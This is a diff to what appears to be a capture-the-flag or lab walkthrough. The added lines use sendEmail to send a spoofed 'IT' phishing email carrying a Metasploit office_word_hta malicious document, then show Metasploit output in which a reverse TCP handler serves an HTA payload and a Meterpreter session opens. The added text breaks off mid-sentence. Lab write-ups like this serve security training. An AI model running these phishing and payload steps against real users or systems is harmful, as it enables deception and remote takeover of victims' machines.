@@ -337,3 +337,22 @@ msf exploit(windows/fileformat/office_word_hta) >
 ```
 Ive configured metasploit with an lhost and lport to connect back to and also set the srvhost to my ip where the malicious attachment will be hosted!
 
+```python
+sendEmail -f IT@megabank.com -t nico@megabank.com -a /home/kali/.msf4/local/msf.doc -u 'Urgent Action Required!' -m 'Please find attached document for more details!' -s 10.129.16.113
+Apr 09 11:59:28 kali sendEmail[81454]: Email was sent successfully!
+```
+This has sent the emai
+
+```python
+msf exploit(windows/fileformat/office_word_hta) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf exploit(windows/fileformat/office_word_hta) > 
+[*] Started reverse TCP handler on 10.10.14.90:4444 
+[+] msf.doc stored at /home/kali/.msf4/local/msf.doc
+[*] Using URL: http://10.10.14.90:8080/default.hta
+[*] Server started.
+[*] Sending stage (196678 bytes) to 10.129.16.113
+[*] Meterpreter session 1 opened (10.10.14.90:4444 -> 10.129.16.113:50282) at 2026-04-09 11:59:43 -0400
+```
+Now i 
